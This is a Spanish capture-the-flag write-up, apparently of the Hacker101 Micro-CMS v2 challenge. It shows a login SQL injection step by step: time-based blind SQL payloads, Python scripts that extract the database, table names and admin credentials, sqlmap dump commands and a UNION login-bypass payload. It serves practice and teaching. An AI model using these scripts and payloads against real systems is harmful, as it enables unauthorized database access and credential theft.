Tenemos lo que parece ser el mismo sitio de la versión uno:

![image](https://user-images.githubusercontent.com/43856126/114126795-a7347680-98e8-11eb-9836-a8504543979a.png)

Con el cambio de que ahora si queremos editar o crear una nueva página nos redirige a un login:

![image](https://user-images.githubusercontent.com/43856126/114126865-be736400-98e8-11eb-8cae-749fa0d3e71e.png)

# Flag 0
Aquí lo primero que se me ocurre al ver un login es probar algo de SQL injection, así que con una prueba básica:

![image](https://user-images.githubusercontent.com/43856126/114126962-faa6c480-98e8-11eb-8530-2467ca3f768b.png)

Y esto nos dice que la contraseña no es la correcta:

![image](https://user-images.githubusercontent.com/43856126/114126995-07c3b380-98e9-11eb-8b3e-bb3d1f6bc3f0.png)

En este caso podríamos tratar de hacer un ataque de diccionario para ver si podemos encontrar la constraseña, pero a modo de prueba tratamos de romper la consulta simplemente agregando una comilla simple:

![image](https://user-images.githubusercontent.com/43856126/114127356-cd0e4b00-98e9-11eb-81d5-8810c660fe4a.png)

Y esto nos da un error:

![image](https://user-images.githubusercontent.com/43856126/114127406-e0211b00-98e9-11eb-98e2-c7fafbd74617.png)

Traté con algunos payloads para error based, pero lo que parece ser aquí es que tendríamos que usar un poco de blind SQL, así, que probando con un sleep se puede ver que se puede disparar el sleep
 
![image](https://user-images.githubusercontent.com/43856126/114129537-427c1a80-98ee-11eb-9a6b-652fd75e7c88.png)

En esta parte se podría hacer uso de sqlmap para hacerlo mucho más rápido, pero a manera de práctica me decidí hacerlo implementando scripts desarrollados en python 3

Dicho esto, el payload base para hacer todas mis pruebas será con un time delay, así que el primero payload quedaría cómo:

`' union SELECT IF(LENGTH(database())=1,sleep(5),'a')-- -`

Esto es para determinar primero la longitud del nombre de la base de datos.

Mi script final qudaría de la siguiente manera, ya incluye el computo del tiempo para determinar si se tarda cierto tiempo...

```
import requests
from time import time

#payload = "' UNION SELECT IF(LENGTH(database())=1,sleep(5),'a')-- -"
for i in range (30):

    payload = "' UNION SELECT IF(LENGTH(database())=" + str(i+1) + ",sleep(5),'a')-- -"
    print ("Payload >> ", payload)
    dat = {"username": payload, "password": "test"}

    url = "http://34.94.3.143/702d18a2c3/login"
    
    time_start = time()
    r = requests.post(url, data = dat)
    time_end = time()
    
    timeT = time_end - time_start
    if timeT > 4:
        print("[+] Longitud entontrada >> ", i + 1)
        break
```


Al ejecutar este script podemos obtener la longitud del nombre de la base de datos que se esta usando:

![image](https://user-images.githubusercontent.com/43856126/114230641-eacec500-9968-11eb-96c7-c342f3260667.png)

Sabemos entonces que el nombre tiene una longitud de 6 caracteres, ahora usando el siguiente payload como base:

`' UNION SELECT IF(SUBSTRING(database(),1,1)='a',sleep(5),'a')-- -`

Con esto podemos construir nuestro script para encontrar el nombre de la base de datos, tenemos que ir cambiando la letra con la que se va compando, así, que ahora el script final quedaría de la siguiente manera:

```
import requests
from time import time
import string

l1 = list(string.ascii_lowercase)
lista = []

for i in range(len(l1)):
    lista.append(str(l1[i]))

for i in range (10):
    lista.append(str(i))   

dump = []

for i in range(6):
    
    for j in lista:

        payload = "' UNION SELECT IF(SUBSTRING(database(),"+str(i+1)+",1)='"+j+"',sleep(5),'a')-- -"
        print("Payload >>", payload)

        dat = {"username":payload,"password":"test"}

        url = "http://34.94.3.143/702d18a2c3/login"
        
        time_start = time()
        r = requests.post(url, data = dat)
        time_end = time()

        timeT = time_end - time_start

        if timeT > 4:
            print("[+] Caracter encontrado >> ", j)
            dump.append(j)
            break

for i in range (len(dump)):
    print(dump[i], end="")
```

Al ejecutar el script tenemos el nombre de la base de datos!

![image](https://user-images.githubusercontent.com/43856126/114232558-91b46080-996b-11eb-85a8-d9d52bc99e35.png)

Ahora sabemos que el nombre de la base de datos es level2, así que ahora toca encontrar las tablas que contiene esta base de datos.

Primero intentamos obtener la longitud del nombre de las tablas, así que podemos usar el siguiente payload:

`' UNION SELECT IF(LENGTH((select table_name from information_schema.tables where table_schema='level2' limit 0,1))=a,sleep(5),'a')-- -`

De tal manera que el script final qudaría de la misma menera quel primero para calcular el nombre de la base de datos, pero con la pequeña modificación que el payload esta especificado de la siguiente manera:

`payload = "' UNION SELECT IF(LENGTH((select table_name from information_schema.tables where table_schema='level2' limit 0,1))="+str(i+1)+",sleep(5),'a')-- -"`

El valor después de limit se tiene que ir modificando manualmente, y esto quiere decir que al evaluar con 0,1 estoy buscando la primera tabla, al cambiar a 1,1 estaría buscando la segunda tabla, y al 2,1 la tercer tabla, y así... Obviamente cuando no encuentre la longitud de alguna es porque no existe esa tabla.

Así que de esta manera el resultado que nos da que son dos tablas, con una longitud de 6 la primera y 5 la segunda:

![image](https://user-images.githubusercontent.com/43856126/114314131-f3e6a000-9ae8-11eb-8802-d74ae32f9c4d.png)

![image](https://user-images.githubusercontent.com/43856126/114314146-02cd5280-9ae9-11eb-98cd-e70d2c96600a.png)

El payload para encontrar al nombre de las tablas, será de la siguiente manera:

`payload = "' UNION SELECT IF(SUBSTRING((SELECT table_name from information_schema.tables where table_schema='level2' limit 0,1),1,1)='a',sleep(5),'a')-- -"`

Y al igual qudaría de la misma manera que el script para encontrar el nombre de la base de datos, pero con la midificación de este paylaod, y quedaría asi:

`payload = "' UNION SELECT IF(SUBSTRING((SELECT table_name from information_schema.tables where table_schema='level2' limit 0,1),"+str
(i+1)+",1)='"+j+"',sleep(5),'a')-- -"`

Después de la ejecución y modificación del script al igualmente en limit, tenemos el nombre de las dos tablas que son admins y pages:

![image](https://user-images.githubusercontent.com/43856126/114315555-04017e00-9aef-11eb-992b-44144cb43985.png)

![image](https://user-images.githubusercontent.com/43856126/114315595-2eebd200-9aef-11eb-8c7b-6374470c89fc.png)

Para encontrar las columas de la tabla de admins que es la interesante, y usando ahora el siguiente payload:

`payload = "' UNION SELECT IF(LENGTH((SELECT column_name from information_schema.columns where table_name='admins' limit 3,1))=" + str(i+1) + ",sleep(5),'a')-- -"`

Y usando la misma idea del script para encontrar las longitudes tenemos los resultados, de un total de 3 columnas, con longitudes 2, 8 y 8:

![image](https://user-images.githubusercontent.com/43856126/114316022-4330ce80-9af1-11eb-96a0-72dbb9b69700.png)

![image](https://user-images.githubusercontent.com/43856126/114316040-50e65400-9af1-11eb-82df-7a98d58c6759.png)

![image](https://user-images.githubusercontent.com/43856126/114316055-5d6aac80-9af1-11eb-82a8-401e263746cf.png)

Si razonamos un poco podemos adivinar directamente el nombre de estas columnas, que serían por sus longitudes:

-id
-username
-password

Con eso en mente, ahora podemos tratar de dumpear los datos de esa tabla con el siguiente payload:

`payload = "' UNION SELECT IF(SUBSTRING((SELECT username from level2.admins limit 0,1),1,1)='a',sleep(5),'a')-- -"`

Esto fue correcto ya que al ejecutar el script se puede obtener un nombre de usuario y el único existente en esta tabla:

![image](https://user-images.githubusercontent.com/43856126/114316825-ce5f9380-9af4-11eb-977c-969758e7227e.png)

Y la contraseña

![image](https://user-images.githubusercontent.com/43856126/114316892-17afe300-9af5-11eb-8772-46bb9c68f240.png)

Con las credenciales encontradas podemos iniciar sesión en el login y podemos obtener nuestra primera bandera:

![image](https://user-images.githubusercontent.com/43856126/114316920-37dfa200-9af5-11eb-9f11-bbf09527f2a2.png)

# Flag 1

Ahora para encontrar la bandera 1 se puede seguir dumpeando datos de la siguiente tabla que nos faltaba, y se puede seguir haciendo con los scripts anteriores, pero para ver otra menera de hacerlo ahora se hará con sqlmap, primero se intercepta la petición de inicio de sesión con credenciales no válidas en el login:

![image](https://user-images.githubusercontent.com/43856126/114317161-4d090080-9af6-11eb-87b1-f02deea62b07.png)

Todo el texto que nos da se tiene que guardar a un archivo, ahora en una consola podemos especificar el nombre de un archivo con la flag -r, y le indicamos el parmámetro vulnerable con -p

`sqlmap -r request -p username`

Despues nos dira que es vulnerable, ahora anteriormente descubrimos que el nombre de la base de datos era level2, así que lo podemos especificar directamente y podemos dumpear los datos con:

`sqlmap -r request -p username -D level2 --dump`

Y así nos dará todos los datos de la base de datos directamente, y así podemos ver que en la tabla que nos faltaba revisar tenemos otra bandera:

![image](https://user-images.githubusercontent.com/43856126/114317263-be48b380-9af6-11eb-9b6a-01d4f8f60765.png)

# Flag 2

Aquí no sabía muy bien que hacer, ya que había sacado todo lo de la base de datos, y después de investigar llegué hasta los blogs de hacker101 que hablan sobre este mismo reto y mencionan algo que no sabía hasta el momento que se podía hacer a manera de bypass, que es simplemente hacer lo siguiente:

Se puede hacer una modificación de la consulta de tal manera que nosotros podemos especificar la password con el payload:

`' UNION SELECT "123" as password-- -`

Esa parte iría en el campo del usuario, y en el campo de la contraseña solo se escribe lo que se especificó entre las comillas...

![image](https://user-images.githubusercontent.com/43856126/114317670-c4d82a80-9af8-11eb-997a-3e1aeb33a37a.png)

Y después de hacer eso se puede logear directamente:

![image](https://user-images.githubusercontent.com/43856126/114317707-e802da00-9af8-11eb-96c6-e19d902a8611.png)

Y al ir a home podemos ver que hay una página que no se puede ver a menos que se este logeado:

![image](https://user-images.githubusercontent.com/43856126/114317744-12ed2e00-9af9-11eb-8bbf-71cfe6f5bbea.png)

Y al visitar esa nueva página podemos encontrar la última bandera:

![image](https://user-images.githubusercontent.com/43856126/114317761-28625800-9af9-11eb-9e4b-365f792f174d.png)

